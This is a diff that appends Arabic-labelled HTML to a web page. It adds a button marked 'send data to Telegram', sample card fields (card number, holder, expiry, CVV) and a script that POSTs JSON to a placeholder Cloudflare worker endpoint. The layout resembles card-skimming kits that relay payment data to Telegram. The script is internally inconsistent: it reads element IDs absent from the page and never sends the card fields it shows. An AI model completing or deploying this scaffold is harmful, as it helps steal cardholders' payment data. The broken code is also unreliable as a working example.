@@ -403,5 +403,81 @@
     }
 });
   </script>
+
+<!-- مثال على زر الإرسال -->
+<button
+  id="sendDataButton"
+  type="button"
+>
+  إرسال البيانات إلى تلجرام
+</button>
+
+<!-- مثال على بيانات موجودة في الصفحة -->
+<p>
+  رقم البطاقة:
+  <span id="cardNumber">1234 5678 9012 3456</span>
+</p>
+
+<p>
+  اسم حامل البطاقة:
+  <span id="cardHolder">أحمد</span>
+</p>
+ 
+<p>
+  تاريخ الانتهاء:
+  <span id="expiryDateInput">12/25</span>
+</p>
+
+<p>
+  CVV:
+  <span id="cvv">123</span>
+</p>
+
+<script>
+  const API_URL =
+    "https://YOUR-WORKER.workers.dev/submit";
+
+  document
+    .getElementById("sendDataButton")
+    .addEventListener("click", async () => {
+      const button = document.getElementById(
+        "sendDataButton"
+      );
+
+      const data = {
+        customerName: document
+          .getElementById("customerName")
+          .textContent.trim(),
+
+        orderNumber: document
+          .getElementById("orderNumber")
+          .textContent.trim()
+      };
+
+      button.disabled = true;
+
+      try {
+        const response = await fetch(API_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
+
+        if (!response.ok) {
+          throw new Error("فشل إرسال البيانات");
+        }
+
+        alert("تم إرسال البيانات بنجاح");
+      } catch (error) {
+        console.error(error);
+        alert("تعذّر الإرسال، حاول مرة أخرى");
+      } finally {
+        button.disabled = false;
+      }
+    });
+</script>
+
 </body>
 </html>
